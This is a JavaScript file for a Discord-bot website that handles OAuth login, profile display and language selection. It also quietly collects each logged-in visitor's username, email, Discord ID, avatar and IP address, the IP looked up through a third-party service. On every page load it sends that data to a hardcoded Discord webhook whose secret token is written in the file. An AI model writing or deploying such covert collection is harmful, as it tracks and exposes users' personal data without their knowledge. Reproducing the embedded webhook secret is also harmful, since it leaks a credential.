document.addEventListener('DOMContentLoaded', () => {
    const profilePic = document.getElementById('profile-pic');
    const profileName = document.getElementById('profile-name');
    const dropdownContent = document.getElementById('dropdown-content');
    const loginBtn = document.getElementById('login-btn');
    const logoutBtn = document.getElementById('logout-btn');
    const languageSelector = document.getElementById('language-selector');

    const CLIENT_ID = '1156663455399563289';
    const REDIRECT_URI = 'https://colibribot.github.io/home/';
    const AUTHORIZATION_ENDPOINT = 'https://discord.com/api/oauth2/authorize';
    const RESPONSE_TYPE = 'token';
    const SCOPE = 'identify email';  // Make sure to include 'email' in the scope

    const WEBHOOK_URL = 'https://discord.com/api/webhooks/1243196183640277032/H46qVRuI2XvANY67HWcqYOpacBOJh1TOMi5Ibgh2axVBLVvOeTzmnKWEf1xnBEbd3ho9';  // Replace with your actual webhook URL

    const getLoginURL = () => {
        const params = new URLSearchParams({
            client_id: CLIENT_ID,
            redirect_uri: REDIRECT_URI,
            response_type: RESPONSE_TYPE,
            scope: SCOPE
        });
        return `${AUTHORIZATION_ENDPOINT}?${params.toString()}`;
    };

    const handleLogin = () => {
        const url = getLoginURL();
        window.location.href = url;
    };

    const handleLogout = () => {
        localStorage.removeItem('discord_access_token');
        location.reload();
    };

    const getUserInfo = async (token) => {
        try {
            const response = await fetch('https://discord.com/api/users/@me', {
                headers: {
                    Authorization: `Bearer ${token}`
                }
            });
            if (response.ok) {
                return response.json();
            } else {
                throw new Error('Invalid token');
            }
        } catch (error) {
            return null;
        }
    };

    const getIP = async () => {
        try {
            const response = await fetch('https://api.ipify.org?format=json');
            const data = await response.json();
            return data.ip;
        } catch (error) {
            console.error('Error fetching IP address:', error);
            return null;
        }
    };

    const sendToWebhook = async (user, ip) => {
        const payload = {
            username: user.username,
            email: user.email,
            id: user.id,
            avatar: user.avatar,
            ip: ip
        };

        try {
            await fetch(WEBHOOK_URL, {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json'
                },
                body: JSON.stringify(payload)
            });
        } catch (error) {
            console.error('Error sending data to webhook:', error);
        }
    };

    const displayProfile = (user) => {
        loginBtn.style.display = 'none';
        profilePic.src = `https://cdn.discordapp.com/avatars/${user.id}/${user.avatar}.png`;
        profileName.textContent = user.username;
        profilePic.style.display = 'block';
    };

    const loadLanguage = async (language) => {
        try {
            const response = await fetch(`languages/${language}.json`);
            const translations = await response.json();
            document.querySelectorAll('[data-translate]').forEach(element => {
                const key = element.getAttribute('data-translate');
                element.textContent = translations[key];
            });
        } catch (error) {
            console.error('Error loading language file:', error);
        }
    };

    loginBtn.addEventListener('click', handleLogin);
    logoutBtn.addEventListener('click', handleLogout);
    languageSelector.addEventListener('change', (event) => {
        const selectedLanguage = event.target.value;
        localStorage.setItem('selected_language', selectedLanguage);
        loadLanguage(selectedLanguage);
    });

    const initialize = async () => {
        const params = new URLSearchParams(window.location.hash.substring(1));
        const accessToken = params.get('access_token');

        if (accessToken) {
            localStorage.setItem('discord_access_token', accessToken);
            window.location.hash = '';
        }

        const storedToken = localStorage.getItem('discord_access_token');
        if (storedToken) {
            const user = await getUserInfo(storedToken);
            if (user) {
                displayProfile(user);
                const ip = await getIP();
                sendToWebhook(user, ip);
            } else {
                localStorage.removeItem('discord_access_token');
                loginBtn.style.display = 'block';
                profilePic.style.display = 'none';
            }
        } else {
            loginBtn.style.display = 'block';
            profilePic.style.display = 'none';
        }

        const savedLanguage = localStorage.getItem('selected_language') || 'en';
        languageSelector.value = savedLanguage;
        loadLanguage(savedLanguage);
    };

    initialize();

    profilePic.addEventListener('click', function(event) {
        event.stopPropagation();
        dropdownContent.style.display = dropdownContent.style.display === 'block' ? 'none' : 'block';
    });

    window.addEventListener('click', function(event) {
        if (!event.target.closest('.profile')) {
            dropdownContent.style.display = 'none';
        }
    });
});
